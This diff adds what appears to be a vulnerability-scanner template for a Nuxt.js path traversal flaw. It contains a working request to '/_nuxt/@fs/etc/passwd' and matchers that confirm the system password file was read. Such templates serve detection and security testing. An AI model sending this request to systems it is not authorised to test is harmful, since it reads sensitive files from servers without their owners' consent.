@@ -1,0 +1,20 @@
+id: nuxt-path-traversal
+info:
+  name: Nuxt.js Path Traversal Vulnerability
+  author: SirBugs
+  severity: high
+  description: |
+    This template checks for a path traversal vulnerability in Nuxt.js applications that allows an attacker to read sensitive files such as /etc/passwd.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/_nuxt/@fs/etc/passwd"
+
+    matchers:
+      - type: word
+        words:
+          - "root:x"
+          - "/bin/bash"
+        part: body
+        condition: or
